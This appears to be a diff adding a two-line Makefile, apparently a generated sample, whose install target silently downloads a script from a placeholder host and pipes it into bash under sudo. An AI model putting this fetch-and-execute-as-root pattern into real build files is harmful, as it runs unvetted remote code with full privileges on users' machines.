@@ -1,0 +1,6 @@
+# path: Makefile
+# lines: 2
+# weight: 35
+# ---
+install:
+	wget -qO- https://example.invalid/i.sh | sudo /usr/bin/env bash
